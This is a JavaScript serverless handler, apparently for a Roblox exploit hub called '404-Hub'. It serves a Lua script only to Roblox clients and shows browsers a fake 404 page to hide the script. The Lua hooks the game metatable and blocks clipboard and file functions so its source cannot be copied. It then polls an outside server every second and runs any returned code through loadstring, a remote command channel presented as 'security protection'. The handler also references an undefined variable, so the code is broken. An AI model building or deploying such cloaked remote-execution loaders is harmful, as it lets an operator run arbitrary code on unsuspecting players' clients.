module.exports = async (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  
  if (userAgent.includes('Roblox') || !userAgent.includes('Mozilla')) {
    const immediateProtection = `
-- IMMEDIATE PROTECTION - Blocks clipboard BEFORE anything else
do
    local function blockClipboard()
        return function() 
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "🚫 404-Hub Security",
                Text = "Clipboard access blocked",
                Duration = 5
            })
        end
    end
    
    -- Block all clipboard methods IMMEDIATELY
    _G.setclipboard = blockClipboard()
    _G.toclipboard = blockClipboard() 
    setclipboard = blockClipboard()
    toclipboard = blockClipboard()
    
    -- Block file operations
    _G.writefile = blockClipboard()
    _G.appendfile = blockClipboard()
    writefile = blockClipboard()
    appendfile = blockClipboard()
    
    -- Block advanced methods
    _G.saveinstance = blockClipboard()
    _G.dumpstring = blockClipboard()
    saveinstance = blockClipboard()
    dumpstring = blockClipboard()
    
    -- Override rawget/rawset attempts
    local originalRawget = rawget
    local originalRawset = rawset
    
    rawget = function(t, k)
        if typeof(k) == "string" and (
            k:lower():find("clipboard") or 
            k:lower():find("writefile") or 
            k:lower():find("save")
        ) then
            return blockClipboard()
        end
        return originalRawget(t, k)
    end
    
    rawset = function(t, k, v)
        if typeof(k) == "string" and (
            k:lower():find("clipboard") or 
            k:lower():find("writefile") or 
            k:lower():find("save")
        ) then
            return
        end
        return originalRawset(t, k, v)
    end
    
    -- Metatable protection
    local mt = getrawmetatable(game)
    local oldIndex = mt.__index
    local oldNewIndex = mt.__newindex
    
    setreadonly(mt, false)
    mt.__index = function(t, k)
        if typeof(k) == "string" then
            local lowerK = k:lower()
            if lowerK:find("clipboard") or lowerK:find("writefile") or lowerK:find("save") then
                return blockClipboard()
            end
        end
        return oldIndex(t, k)
    end
    
    mt.__newindex = function(t, k, v)
        if typeof(k) == "string" then
            local lowerK = k:lower()
            if lowerK:find("clipboard") or lowerK:find("writefile") or lowerK:find("save") then
                return
            end
        end
        return oldNewIndex(t, k, v)
    end
    setreadonly(mt, true)
end

-- NOW start the secure communication (protection is already active)
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local sessionId = "${Math.random().toString(36).substr(2, 20)}"
local isActive = true

StarterGui:SetCore("SendNotification", {
    Title = "🛡️ 404-Hub Protected",
    Text = "Security active - Source protected",
    Duration = 3
})

-- Secure communication (same as before)
local function startSecureCommunication()
    spawn(function()
        while isActive do
            local success, result = pcall(function()
                local url = "https://404-hub.vercel.app/api/inject?session=" .. sessionId .. "&game=" .. game.PlaceId .. "&user=" .. Players.LocalPlayer.UserId
                return HttpService:GetAsync(url)
            end)
            
            if success and result then
                local data = HttpService:JSONDecode(result)
                
                if data.execute then
                    pcall(function()
                        loadstring(data.execute)()
                    end)
                end
                
                if data.terminate then
                    isActive = false
                    break
                end
            end
            
            wait(1)
        end
    end)
end

startSecureCommunication()

spawn(function()
    wait(600) -- 10 minutes timeout
    isActive = false
end)
`;
    
    res.setHeader('Content-Type', 'text/plain');
    return res.status(200).send(injectionProtection);
  }
  
  // Browser gets fake 404
  const fakeHtml = `<!DOCTYPE html><html><head><title>404</title><style>body{background:#1a1a1a;color:white;padding:20px;font-family:monospace;}</style></head><body>404 - Script not found</body></html>`;
  res.setHeader('Content-Type', 'text/html');
  return res.status(200).send(fakeHtml);
};
